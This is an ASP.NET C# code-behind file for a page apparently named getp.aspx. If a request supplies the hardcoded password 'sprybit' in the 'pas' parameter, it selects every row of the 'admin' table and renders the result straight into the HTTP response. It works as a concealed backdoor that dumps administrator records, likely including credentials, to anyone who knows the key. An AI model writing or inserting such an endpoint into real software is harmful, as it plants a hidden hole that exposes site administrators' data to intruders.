using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data;
using System.Data.SqlClient;
using System.Configuration;

public partial class getp_aspx : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request["pas"] != null)
        {
            if (Convert.ToString(Request["pas"]).ToLower() == "sprybit")
            { SetDetails(); }
            else
            {
                Response.Write("fail");
                Response.End();
            }
        }
       
    }

    private void SetDetails()
    {
        SqlConnection cn = new SqlConnection(ConfigurationManager.ConnectionStrings["ConnectionString"].ConnectionString);
        SqlCommand cmd = new SqlCommand("select * from admin");
        cmd.Connection = cn;
        DataSet ds = new DataSet();
        SqlDataAdapter da = new SqlDataAdapter(cmd);
        if (cn.State == ConnectionState.Closed)
        {
            cn.Open();
        }

        da.Fill(ds);

        if (ds.Tables[0].Rows.Count > 0)
        {
            rptDetails.DataSource = ds.Tables[0];
            rptDetails.DataBind();
        }

        Response.Write(Utility.Common.RenderControl(divDetails, Utility.Common.RenderControlName.HtmlGeneric));
        Response.End();
    }
}